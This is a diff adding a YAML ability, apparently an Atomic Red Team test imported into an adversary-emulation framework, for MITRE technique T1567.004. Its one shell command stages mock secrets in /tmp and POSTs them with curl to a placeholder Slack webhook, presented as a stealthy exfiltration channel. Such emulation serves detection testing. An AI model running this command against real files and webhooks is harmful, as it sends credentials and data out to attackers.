@@ -1,0 +1,47 @@
+- id: c666acd6-6ff5-4d28-9490-195d89cd4337
+  name: Exfiltrate staged data to a Slack webhook with curl (sh)
+  description: 'Stages a file containing simulated sensitive data and exfiltrates
+    its contents to a
+
+    Slack incoming webhook by POSTing a JSON `text` payload with curl. Slack incoming
+
+    webhooks accept unauthenticated JSON POSTs, making them a low-friction exfiltration
+
+    channel that blends with legitimate collaboration traffic.
+
+    See https://api.slack.com/messaging/webhooks'
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.004
+    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+  platforms:
+    linux:
+      sh:
+        command: 'echo "secrets, api keys, passwords - T1567.004 atomic test" > "/tmp/T1567.004_loot.txt";
+          curl -s -X POST -H ''Content-type: application/json'' --data "{\"text\":\"$(cat
+          /tmp/T1567.004_loot.txt)\"}" "https://hooks.slack.com/services/T00000000/B00000000/ReplaceWithYourWebhookToken"'
+        cleanup: rm -f "#{staged_file}"
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1567.004
+  - exfiltration
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      webhook_url:
+        description: Slack incoming webhook URL the staged data is exfiltrated to
+        type: string
+        default: https://hooks.slack.com/services/T00000000/B00000000/ReplaceWithYourWebhookToken
+      staged_file:
+        description: Path to the file that is staged and exfiltrated
+        type: path
+        default: /tmp/T1567.004_loot.txt
+    technique_created: '2023-07-20T15:30:55.763Z'
+    atomic_guid: c666acd6-6ff5-4d28-9490-195d89cd4337
+    import_timestamp: '2026-06-25T06:06:36.517629Z'
